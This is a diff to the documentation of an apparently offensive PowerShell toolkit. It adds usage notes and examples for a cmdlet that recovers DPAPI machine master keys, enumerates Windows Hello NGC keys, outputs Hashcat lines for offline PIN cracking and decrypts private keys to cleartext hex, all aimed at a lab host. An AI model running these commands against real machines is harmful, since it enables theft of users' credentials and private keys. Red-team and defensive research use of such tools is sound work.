@@ -810,6 +810,9 @@ Get-TBONGCInfo -ServerName corp1-wks01.corp1.lab.home-labs.lol -IncludeProtector
 
 Enumerates `C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys` and correlates key material with NGC containers.
 This cmdlet can decrypt NGC private key properties (to extract PBKDF2 salt/rounds) and optionally emit `$WINHELLO$*...` Hashcat mode 28100 lines for offline PIN cracking.
+If you already know the Windows Hello PIN for a software-protected key, you can also attempt PIN-based decryption of the private key blob by supplying `-Pin` along with `-TryDecryptPrivateKey`.
+
+Note: TPM-backed keys may not be decryptable even with the correct PIN.
 
 ```powershell
 # Recover decrypted machine master keys (DPAPI_SYSTEM -> masterkeys), then enumerate matching NGC crypto keys.
@@ -825,6 +828,13 @@ Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys
 
 # Filter by a specific key GUID (works even if NGC enumeration is blocked)
 Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk -KeyGuid '{01234567-89ab-cdef-0123-456789abcdef}' -IncludeHashcat
+
+# Attempt PIN-based private key decryption (software keys only).
+# PIN is only used when -TryDecryptPrivateKey is specified.
+$pin = Read-Host -AsSecureString 'Windows Hello PIN'
+Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys $mk -TryDecryptPrivateKey -Pin $pin |
+  Where-Object PrivateKeyDecrypted |
+  Select-Object CryptoKeyGuid, NgcGuid, PrivateKeyMasterKeyGuid, PrivateKeyCleartextHex
 ```
 
 #### Get-TBODpapiBlob
